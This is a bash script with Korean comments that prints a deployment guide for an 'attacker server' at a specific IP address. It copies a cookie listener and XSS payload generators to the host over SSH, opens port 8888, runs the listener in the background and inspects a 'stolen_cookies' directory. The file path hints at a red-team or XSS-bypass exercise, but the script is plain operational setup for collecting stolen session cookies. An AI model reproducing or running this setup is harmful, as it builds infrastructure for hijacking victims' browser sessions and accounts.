#!/bin/bash
# 공격자 서버 배포 명령어 모음

echo "════════════════════════════════════════════════"
echo "  공격자 서버 (3.113.201.239) 배포 가이드"
echo "════════════════════════════════════════════════"
echo ""

# SSH 키 경로 (공백 포함 주의!)
SSH_KEY="$HOME/Downloads/A team.pem"
SERVER_IP="3.113.201.239"
SERVER_USER="ec2-user"  # 또는 ubuntu

echo "📝 Step 1: SSH 키 권한 설정"
echo "----------------------------------------"
echo "chmod 400 \"$SSH_KEY\""
echo ""

echo "📤 Step 2: 파일 전송 (필수 파일만)"
echo "----------------------------------------"
echo "scp -i \"$SSH_KEY\" \\"
echo "    cookie_listener.py \\"
echo "    $SERVER_USER@$SERVER_IP:~/"
echo ""

echo "📤 Step 2-1: 전체 파일 전송 (권장)"
echo "----------------------------------------"
echo "scp -i \"$SSH_KEY\" \\"
echo "    cookie_listener.py \\"
echo "    deploy_listener.sh \\"
echo "    advanced_payloads.py \\"
echo "    payload_generator.py \\"
echo "    $SERVER_USER@$SERVER_IP:~/"
echo ""

echo "🔌 Step 3: SSH 접속"
echo "----------------------------------------"
echo "ssh -i \"$SSH_KEY\" $SERVER_USER@$SERVER_IP"
echo ""

echo "════════════════════════════════════════════════"
echo "  서버에서 실행할 명령어"
echo "════════════════════════════════════════════════"
echo ""

echo "🛠️ Step 4: 의존성 설치 (최초 1회)"
echo "----------------------------------------"
cat << 'EOF'
pip3 install flask
chmod +x cookie_listener.py deploy_listener.sh
sudo ufw allow 8888/tcp
EOF
echo ""

echo "🚀 Step 5: 리스너 시작 (백그라운드)"
echo "----------------------------------------"
cat << 'EOF'
nohup python3 cookie_listener.py > listener.log 2>&1 &
echo "리스너 PID: $!"
tail -f listener.log
EOF
echo ""

echo "🧪 Step 6: 동작 확인 (로컬에서)"
echo "----------------------------------------"
echo "curl http://$SERVER_IP:8888/health"
echo ""

echo "📊 Step 7: 쿠키 확인 (서버에서)"
echo "----------------------------------------"
cat << 'EOF'
ls -lh stolen_cookies/
cat stolen_cookies/cookie_*.json | tail -1
EOF
echo ""

echo "════════════════════════════════════════════════"
echo "  빠른 실행 (복사해서 붙여넣기)"
echo "════════════════════════════════════════════════"
echo ""

echo "# 1. 키 권한 + 파일 전송 + 접속"
echo "chmod 400 \"$HOME/Downloads/A team.pem\" && \\"
echo "cd ~/Desktop/Red_basic_local/H/xss우회 && \\"
echo "scp -i \"$HOME/Downloads/A team.pem\" cookie_listener.py deploy_listener.sh $SERVER_USER@$SERVER_IP:~/ && \\"
echo "ssh -i \"$HOME/Downloads/A team.pem\" $SERVER_USER@$SERVER_IP"
echo ""

echo "# 2. 서버에서 실행"
cat << 'EOF'
pip3 install flask && \
chmod +x *.py *.sh && \
nohup python3 cookie_listener.py > listener.log 2>&1 & \
sleep 2 && tail -f listener.log
EOF
